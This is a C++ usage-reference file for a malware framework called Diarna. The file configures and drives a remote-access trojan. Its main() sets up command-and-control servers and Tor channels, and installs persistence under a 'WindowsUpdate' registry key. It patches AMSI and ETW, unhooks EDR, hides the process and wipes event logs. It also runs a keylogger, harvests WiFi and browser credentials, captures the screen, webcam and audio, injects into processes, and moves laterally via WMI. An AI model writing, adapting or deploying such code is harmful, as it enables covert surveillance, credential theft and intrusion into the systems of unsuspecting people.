#include <diarna/compiler_port.hpp>
#include <diarna/diarna.hpp>
#include <cstdio>
#include <csignal>

static std::atomic<bool> g_running{true};
static void signal_handler(int) { g_running = false; }

// =============================================================================
// Diarna Framework — Usage Reference
// =============================================================================
// Lifecycle:  default_config() → tweak config → agent.arm() → agent.deploy()
//             → access subsystems → agent.status() → agent.stand_down()
// =============================================================================

int main(int argc, char* argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // ── 1. CONFIGURATION ────────────────────────────────────────────────────
    auto cfg = diarna::default_config();

    // --- Identity ---
    cfg.agent_id = "diarna-demo";

    // --- C2 server ---
    cfg.comm.servers.push_back({"192.168.1.100", 4444});
    cfg.comm.servers.push_back({"10.0.0.50", 8443});   // failover
    cfg.comm.reconnect         = std::chrono::seconds(30);
    cfg.comm.heartbeat         = std::chrono::seconds(60);
    cfg.comm.jitter            = true;                   // randomize timing
    cfg.comm.kill_date_enabled = true;
    cfg.comm.kill_date         = "2026-12-31";           // self-destruct

    // --- Tor dual-channel ---
    cfg.comm.tor.enabled       = true;
    cfg.comm.tor.embedded      = true;   // self-contained, no external Tor

    // --- Persistence (survive reboots) ---
    cfg.persistence.registry_run     = true;
    cfg.persistence.scheduled_task   = true;
    cfg.persistence.startup_folder   = true;
    cfg.persistence.windows_service  = false; // needs admin
    cfg.persistence.wmi_subscription = false;
    cfg.persistence.hide_taskmgr     = true;
    cfg.persistence.mask_pid         = true;

    // --- Stealth ---
    cfg.stealth.anti_vm         = true;
    cfg.stealth.anti_debug      = true;
    cfg.stealth.anti_sandbox    = true;
    cfg.stealth.anti_anyrun     = true;  // dedicated Any.Run sandbox check
    cfg.stealth.anti_hook       = true;  // detect & unhook EDR API hooks
    cfg.stealth.patch_etw       = true;  // silence ETW logging
    cfg.stealth.patch_amsi      = true;  // silence AMSI scanning
    cfg.stealth.vault_memory    = true;  // VEH guard-page memory encryption
    cfg.stealth.unlink_peb      = true;  // hide from process list
    cfg.stealth.clear_logs      = true;  // wipe event logs

    // --- Collection ---
    cfg.collection.keylogger  = true;
    cfg.collection.clipboard  = true;
    cfg.collection.wifi_passwords    = true;
    cfg.collection.browser_passwords = true;

    // --- Crypto ---
    // 32-byte key for ChaCha20-Poly1305 AEAD
    cfg.encryption_key = {0x4d,0x61,0x67,0x69,0x63,0x53,0x74,0x61,0x72,
                          0x44,0x69,0x61,0x72,0x6e,0x61,0x5f,0x4b,0x65,
                          0x79,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,
                          0x21,0x21,0x21,0x21,0x21};


    // ── 2. ARM (verify environment, apply stealth) ──────────────────────────
    diarna::DiarnaFramework agent(cfg);

    if (!agent.arm()) {
        printf("[!] Environment check failed — VM/sandbox detected\n");
        return 1;
    }
    printf("[+] Armed — stealth applied, syscalls resolved, Tor client ready\n");


    // ── 3. DEPLOY (persist + start collection) ──────────────────────────────
    if (!agent.deploy()) {
        printf("[!] Deployment failed\n");
        return 1;
    }
    printf("[+] Deployed — persistence installed, collectors running\n");


    // ── 4. USE SUBSYSTEMS ───────────────────────────────────────────────────

    // --- Screenshot ---
    {
        auto jpg = agent.screenshot().capture_jpeg(85);
        printf("[*] Screenshot captured: %zu bytes\n", jpg.size());
    }

    // --- Audio capture (10 seconds) ---
    {
        auto wav = agent.audio().capture_seconds(10, 44100, 2);
        printf("[*] Audio captured: %zu bytes (WAV)\n", wav.size());
    }

    // --- Webcam snapshot ---
    {
        agent.webcam().open(0, 1280, 720);
        auto frame = agent.webcam().capture_frame_bmp();
        printf("[*] Webcam frame: %zu bytes\n", frame.size());
        agent.webcam().close();
    }

    // --- Desktop stream via DXGI ---
    {
        agent.desktop().start([](std::span<const uint8_t> bgra, uint32_t w, uint32_t h) {
            printf("[*] Desktop frame: %ux%u, %zu bytes\n", w, h, bgra.size());
        }, 15);
    }

    // --- Keylogger — dump captured keystrokes ---
    {
        auto keys = agent.keylogger().get_logs();
        if (!keys.empty()) printf("[*] Keystrokes:\n%s\n", keys.c_str());
    }

    // --- Clipboard history ---
    {
        auto history = agent.clipboard().get_history();
        printf("[*] Clipboard entries: %zu\n", history.size());
    }

    // --- Dump WiFi passwords ---
    {
        auto wifi = agent.credentials().dump_wifi_passwords();
        for (auto& w : wifi)
            printf("[*] WiFi: %s\n", w.c_str());
    }

    // --- Dump all browser/email/FTP/VPN credentials (200+ apps) ---
    {
        std::vector<diarna::collection::CredentialEntry> creds;
        agent.harvester().harvest_all(creds);
        printf("[*] Harvested %zu credentials from %zu apps\n",
            creds.size(), agent.harvester().app_count());
    }

    // --- Execute command ---
    {
        diarna::exec::Executor exec;
        auto result = exec.execute("whoami");
        printf("[*] whoami: %s\n", result.stdout_data.c_str());
    }

    // --- PowerShell execution ---
    {
        diarna::exec::Executor exec;
        auto result = exec.execute_powershell("Get-Process | Select -First 5");
        printf("[*] PS output: %s\n", result.stdout_data.substr(0, 200).c_str());
    }

    // --- Run a binary ---
    {
        diarna::exec::Executor exec;
        exec.run_file(L"C:\\Windows\\System32\\notepad.exe", L"", true);
    }

    // --- Process injection (8 techniques) ---
    {
        uint8_t dummy_sc[] = {0x90, 0x90, 0xC3}; // NOP; NOP; RET
        diarna::exec::InjectionConfig inj_cfg;
        inj_cfg.method = diarna::exec::InjectionMethod::EarlyBirdAPC;
        inj_cfg.target_process = L"notepad.exe";
        inj_cfg.randomize_method = true; // pick random technique
        diarna::exec::ProcessInjector::instance().inject(dummy_sc, inj_cfg);
    }

    // --- Network scan ---
    {
        auto targets = agent.movement().scan_network("192.168.1.0/24");
        for (auto& t : targets) {
            printf("[*] Target %s: SMB=%d RDP=%d WinRM=%d\n",
                t.ip.c_str(), t.smb_open, t.rdp_open, t.winrm_open);
        }
    }

    // --- Lateral movement via WMI ---
    {
        agent.movement().wmi_exec("192.168.1.50", "whoami");
    }

    // --- Persistence status ---
    {
        if (diarna::persistence::registry::exists_run_key(L"WindowsUpdate"))
            printf("[*] Registry persistence: ACTIVE\n");
    }

    // --- Agent status snapshot ---
    {
        auto s = agent.status();
        printf("\n═══════ AGENT STATUS ═══════\n");
        printf("ID:           %s\n", s.agent_id.c_str());
        printf("Tor ready:    %s\n", s.tor_ready ? "yes" : "no");
        printf("Uptime:       %llu sec\n", s.uptime_sec);
        printf("Vault pages:  %zu\n", s.vault_pages);
        printf("Vault access: %llu\n", s.vault_accesses);
        printf("Mutations:    %llu\n", s.mutations_total);
        printf("ROP gadgets:  %llu\n", s.rop_gadgets);
        printf("PEB mirrored: %s\n", s.peb_mirrored ? "yes" : "no");
        printf("Sandbox:      %s\n", s.sandbox_detection.c_str());
        printf("Persistence:  ");
        for (auto& p : s.active_persistence) printf("%s ", p.c_str());
        printf("\nEvasion:      ");
        for (auto& e : s.evasion_active) printf("%s ", e.c_str());
        printf("\n════════════════════════════\n");
    }


    // ── 5. MAIN LOOP ────────────────────────────────────────────────────────
    while (g_running && agent.is_active()) {
        Sleep(5000);
        // The framework's main loop handles:
        //   - Memory vault encryption cycling
        //   - Self-mutating code (every 5-15s)
        //   - Self-healing persistence (every 60s)
        //   - Syscall stub re-randomization (every 30 min)
        //   - Anti-hook detection + unhook
        //   - EDR callback removal (every ~500 cycles)
        //   - Emulator detection
    }


    // ── 6. STAND DOWN ───────────────────────────────────────────────────────
    agent.desktop().stop();          // stop streaming
    agent.audio().stop_capture();    // stop audio
    agent.stand_down();              // stop all, uninstall persistence, clear logs
    printf("[+] Clean shutdown complete\n");

    return 0;
}
